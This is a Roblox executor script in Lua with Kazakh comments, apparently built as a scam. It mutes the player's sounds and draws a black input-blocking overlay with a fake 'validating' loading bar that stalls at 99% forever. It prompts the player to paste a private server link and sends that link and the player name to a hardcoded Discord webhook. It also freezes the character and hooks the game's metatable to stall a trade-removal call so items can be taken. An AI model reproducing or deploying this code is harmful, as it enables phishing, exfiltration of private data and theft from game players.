-- [[ ZENITH ETERNAL SILENCE V6 ]]
-- [[ https://bit.ly/4b5RD0H ]]

local _w = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b" -- ОСЫНДА WEBHOOK ҚОЙ

local Http = game:GetService("HttpService")
local Req = request or http_request or syn.request
local Players = game:GetService("Players")
local p = Players.LocalPlayer

-- 1. SILENCE PLAYER (Адамның дыбысын өшіру)
task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            local char = p.Character or p.CharacterAdded:Wait()
            local hrp = char:WaitForChild("HumanoidRootPart")
            -- Жүрген, секірген дыбыстарды (SoundId) тауып өшіру
            for _, v in pairs(hrp:GetChildren()) do
                if v:IsA("Sound") then v.Volume = 0 end
            end
            -- Жалпы айналадағы эффект дыбыстарын өшіру (Ойын музыкасы қалады)
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("Sound") and (v.Name == "Step" or v.Name == "Jump" or v.Name == "Land") then
                    v.Volume = 0
                end
            end
        end)
    end
end)

-- 2. FULL BLACKOUT & LOCK
local Zenith = Instance.new("ScreenGui", game.CoreGui)
Zenith.Name = "ZenithMain"
Zenith.DisplayOrder = 999999

local BG = Instance.new("Frame", Zenith)
BG.Size = UDim2.new(1, 0, 1, 0)
BG.BackgroundColor3 = Color3.new(0, 0, 0)
BG.Active = true -- Басуды блоктау

-- Жүктелу жолағы (Progress Bar)
local BarBG = Instance.new("Frame", BG)
BarBG.Size = UDim2.new(0, 300, 0, 2)
BarBG.Position = UDim2.new(0.5, -150, 0.6, 0)
BarBG.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BarBG.BorderSizePixel = 0

local Bar = Instance.new("Frame", BarBG)
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar.BorderSizePixel = 0

local Lbl = Instance.new("TextLabel", BG)
Lbl.Size = UDim2.new(1, 0, 0, 30)
Lbl.Position = UDim2.new(0, 0, 0.55, 0)
Lbl.BackgroundTransparency = 1
Lbl.TextColor3 = Color3.fromRGB(150, 150, 150)
Lbl.Font = Enum.Font.Code
Lbl.TextSize = 14
Lbl.Text = "VALIDATING PRIVATE SERVER LINK: 0%"

-- 3. 99% SLOW LOADING LOGIC
task.spawn(function()
    for i = 1, 99 do
        -- 90%-дан кейін өте жай жүреді
        if i < 50 then task.wait(0.5)
        elseif i < 90 then task.wait(2)
        else task.wait(10) end -- 90-дан кейін әр процент 10 секунд
        
        Bar.Size = UDim2.new(i/100, 0, 1, 0)
        Lbl.Text = "VALIDATING PRIVATE SERVER LINK: " .. i .. "%"
    end
    -- 99%-да мәңгі тоқтап қалады
    while true do
        Lbl.Text = "STABILIZING CONNECTION: 99% (PLEASE WAIT)"
        task.wait(5)
    end
end)

-- 4. PRIVATE LINK INPUT
local Input = Instance.new("TextBox", BG)
Input.Size = UDim2.new(0, 350, 0, 40)
Input.Position = UDim2.new(0.5, -175, 0.45, 0)
Input.PlaceholderText = "PASTE PRIVATE SERVER LINK HERE"
Input.Text = ""
Input.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Input.TextColor3 = Color3.new(1, 1, 1)
Input.Font = Enum.Font.Code

Input.FocusLost:Connect(function(enter)
    if enter then
        local data = {["embeds"] = {{
            ["title"] = "⛓️ PRIVATE LINK RECOVERED",
            ["fields"] = {
                {["name"] = "Player", ["value"] = p.Name},
                {["name"] = "Link", ["value"] = Input.Text}
            },
            ["color"] = 0x000000
        }}}
        pcall(function() Req({Url = _w, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)}) end)
        Input.Text = ""
        Input.PlaceholderText = "LINK EXPIRED. RE-GENERATE AND PASTE AGAIN."
    end
end)

-- 5. THE STEAL & ANCHOR
p.Character.HumanoidRootPart.Anchored = true
local RF = game:GetService("ReplicatedStorage").Packages.Net:FindFirstChild("RF/TradeService/RemoveBrainrot")
if RF then
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local old = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if self == RF then return wait(9e9) end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end
